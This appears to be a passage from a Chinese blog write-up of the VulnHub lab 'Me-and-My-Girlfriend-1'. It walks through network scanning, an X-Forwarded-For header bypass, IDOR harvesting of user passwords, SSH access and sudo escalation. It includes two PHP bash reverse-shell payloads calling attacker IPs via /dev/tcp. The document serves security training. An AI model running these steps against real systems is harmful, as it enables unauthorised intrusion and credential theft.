+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">./LinEnum.sh -s -<span class="hljs-built_in">t</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159556.png" srcset="/img/loading.gif" lazyload alt="image-20251211153942190"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.100.129/8888 0&gt;&amp;1&#x27;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152159967.png" srcset="/img/loading.gif" lazyload alt="image-20251211192303845"></p>
+<h1 id="第二轮"><a href="#第二轮" class="headerlink" title="第二轮"></a>第二轮</h1><blockquote>
+<p>这一轮用更熟悉的打法</p>
+</blockquote>
+<p>fscan扫一下网段</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.230.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200869.png" srcset="/img/loading.gif" lazyload alt="image-20251211181807367"></p>
+<p>发现靶机IP192.168.230.129，fscan扫一下全端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span>.exe -h <span class="hljs-number">192.168.230.129</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200063.png" srcset="/img/loading.gif" lazyload alt="image-20251211182029726"></p>
+<p>tscanplus扫目录</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200719.png" srcset="/img/loading.gif" lazyload alt="image-20251211182711545"></p>
+<p>&#x2F;robots.txt</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Allow</span><span class="hljs-punctuation">: </span>/heyhoo.txt<br></code></pre></td></tr></table></figure>
+
+<p>&#x2F;heyhoo.txt</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Great<span class="hljs-comment">! What you need now is reconn, attack and got the shell</span><br></code></pre></td></tr></table></figure>
+
+<p>只能回到根目录，访问后页面显示允许本地登录。改xff头，修改完之后我们就进来了。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200113.png" srcset="/img/loading.gif" lazyload alt="image-20251211135713354"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">X</span>-Forwarded-For: localhost<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200753.png" srcset="/img/loading.gif" lazyload alt="image-20251211183028032"></p>
+<p>这结构必须试一试SQL注入和本地包含。之前找到的两个目录下还有两个PHP文件，也许有东西。但是经过测试发现，不存在SQL注入和本地包含。这条路是死了。</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.230.129/?page=index</span><br></code></pre></td></tr></table></figure>
+
+<p>可以注意到又主页、登录、注册、等功能，但是我们不能登录。那就先注 册一个。</p>
+<p>登录之后又看到了熟悉的参数试一试有没有注入。发现还是没有。</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">http://192.168.230.129/<span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">page</span>=dashboard<span class="hljs-variable">&amp;user_id</span>=13<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200118.png" srcset="/img/loading.gif" lazyload alt="image-20251211183533224"></p>
+<p>转念一想，看看传个别的ID值看看什么情况。13没有，也就是说我们是最后一个。看看11也是没有。但是到1之后就又有了。也就说意味着我们可以 得到这些用户的账号密码。哎呦？可以遍历一下。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200468.png" srcset="/img/loading.gif" lazyload alt="image-20251211183606239"></p>
+<p>可以得到6组密码，有的没有，有的有。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200352.png" srcset="/img/loading.gif" lazyload alt="image-20251211183707648"></p>
+<table>
+<thead>
+<tr>
+<th>用户名</th>
+<th>密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>eweuhtandingan</td>
+<td>skuyatuh</td>
+</tr>
+<tr>
+<td>aingmaung</td>
+<td>qwerty!!!</td>
+</tr>
+<tr>
+<td>sundatea</td>
+<td>indONEsia</td>
+</tr>
+<tr>
+<td>sedihaingmah</td>
+<td>cedihhihihi</td>
+</tr>
+<tr>
+<td>alice</td>
+<td>4lic3</td>
+</tr>
+<tr>
+<td>abdikasepak</td>
+<td>dorrrrr</td>
+</tr>
+</tbody></table>
+<p>这不就有了用户名和密码，回手掏，去干SSH得到账号密码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200420.png" srcset="/img/loading.gif" lazyload alt="image-20251211190634799"></p>
+<p>SSH找到第一个flag</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> alice@<span class="hljs-number">192.168.230.129</span><br><span class="hljs-comment"># 密码：4lic3</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200385.png" srcset="/img/loading.gif" lazyload alt="image-20251211191033920"></p>
+<p>有sudo提权漏洞</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200182.png" srcset="/img/loading.gif" lazyload alt="image-20251211191453881"></p>
+<p>搜利用方式</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200791.png" srcset="/img/loading.gif" lazyload alt="image-20251211191528489"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.230.128/9999 0&gt;&amp;1&#x27;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200060.png" srcset="/img/loading.gif" lazyload alt="image-20251211192157381"></p>
+<p>反弹shell，pwncat连接，得到tty</p>
+<p>读flag</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152200859.png" srcset="/img/loading.gif" lazyload alt="image-20251211154733312"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PenTest/" class="category-chain-item">PenTest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/vlunhub/" class="print-no-link">#vlunhub</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vulnhub Me-and-My-Girlfriend-1</div>
+      <div>http://example.com/2026/test42/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test43/" title="vulnhub pwnlab_init">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">vulnhub pwnlab_init</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test65/" title="ctfshow web859_有跳板机">
+                        <span class="hidden-mobile">ctfshow web859_有跳板机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
